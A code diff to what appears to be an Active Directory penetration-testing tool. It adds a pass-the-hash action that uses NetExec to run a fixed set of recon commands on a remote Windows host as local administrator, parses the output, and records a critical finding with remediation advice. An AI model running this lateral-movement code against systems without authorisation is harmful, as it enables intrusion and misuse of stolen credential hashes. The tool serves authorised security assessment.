@@ -638,3 +638,84 @@ def _adcs_esc1(target: str, tgt: Target, *, bus: Optional[EventBus] = None,
 ACTIONS["adcs-esc1"] = Action(
     "adcs-esc1", "Exploit AD CS ESC1 (issue cert)", ("template",),
     offensive=True, handler=_adcs_esc1, warn=_adcs_esc1_warn)
+
+
+# --------------------------------------------------------------------------- #
+# pass-the-hash exec: prove code execution with a FIXED read-only recon battery #
+# --------------------------------------------------------------------------- #
+# The whitelist IS this constant - there is no operator command input, so no arbitrary command
+# can ever run. Highest-risk action (RCE-adjacent), so the guardrail is "no input path at all".
+RECON_BATTERY = "whoami & hostname & ipconfig & systeminfo"
+
+_SMB_PREFIX = re.compile(r"^SMB\s+\S+\s+\d+\s+\S+\s+")     # nxc's "SMB <host> <port> <name> " prefix
+_NXC_STATUS = re.compile(r"^\[[*+\-!]\]")                  # nxc status lines ([*]/[+]/[-]/[!])
+
+
+def parse_pth_exec(raw: str) -> tuple[bool, str]:
+    """Parse `nxc smb -x` output into (success, command_output).
+
+    SMB command exec requires local admin, so success = the `(Pwn3d!)` admin marker AND real
+    command output. Strips nxc's line prefix and its own status lines, leaving the recon output.
+    The captured fixture is the source of truth - VERIFY against real nxc on Kali.
+    """
+    admin = "(Pwn3d!)" in raw
+    out: list[str] = []
+    for line in raw.splitlines():
+        stripped = _SMB_PREFIX.sub("", line).rstrip()
+        if not stripped or _NXC_STATUS.match(stripped):
+            continue
+        out.append(stripped)
+    output = "\n".join(out)
+    return (admin and bool(output)), output
+
+
+def _default_pth_exec_run(tgt: Target) -> str:
+    """Run the fixed recon battery on the host via pass-the-hash (`nxc smb -x`), reusing
+    NetExecEngine's auth (`-H <nthash>` when present, else `-p`). Runs LIVE at execution time.
+    """
+    eng = NetExecEngine()
+    return eng._invoke(["-x", RECON_BATTERY], tgt) if eng.is_available() else ""
+
+
+def _pth_exec_warn(host: str) -> str:
+    return (f"EXECUTES commands on {host} via pass-the-hash - runs code on a production host "
+            f"(read-only recon only: whoami/hostname/ipconfig/systeminfo); requires local admin "
+            f"and will very likely trigger EDR.")
+
+
+def _pth_exec(target: str, tgt: Target, *, bus: Optional[EventBus] = None,
+              runner: Optional[Callable[[Target], str]] = None) -> list[Finding]:
+    """Prove pass-the-hash code execution on `target` by running the fixed recon battery.
+
+    Only emits a finding when the exec actually ran (which requires local admin over SMB), so a
+    hit is always proven admin RCE -> CRITICAL. Consumes a hash; recovers no credential.
+    """
+    success, output = parse_pth_exec((runner or _default_pth_exec_run)(tgt))
+    if not success:
+        return []
+    snippet = "\n".join(output.splitlines()[:4])          # trim; skip the verbose systeminfo dump
+    return [Finding(
+        id="pth-exec",
+        title=f"Command execution via pass-the-hash on {target}",
+        severity=Severity.CRITICAL,
+        category=Category.SMB,
+        description=f"Executed a fixed set of read-only recon commands "
+                    f"(whoami/hostname/ipconfig/systeminfo) on {target} via pass-the-hash, "
+                    f"proving code execution with local administrator rights.",
+        impact="Proven remote code execution as local administrator enables full host compromise, "
+               "credential theft, and lateral movement.",
+        remediation="Rotate the exposed password/NT hash; deploy LAPS for unique per-host "
+                    "local-admin passwords; restrict local admin membership; monitor for remote "
+                    "SMB service/task creation.",
+        affected=[target],
+        evidence=[Evidence(source="netexec", detail=f"exec proof: {snippet}")],
+        references=["https://attack.mitre.org/techniques/T1550/002/",
+                    "https://attack.mitre.org/techniques/T1021/002/"],
+        credentialed=True,
+        meta={"offensive": True, "action": "pth-exec"},    # no credentials - consumes a hash
+    )]
+
+
+ACTIONS["pth-exec"] = Action(
+    "pth-exec", "Run recon via pass-the-hash", ("host",),
+    offensive=True, handler=_pth_exec, warn=_pth_exec_warn)
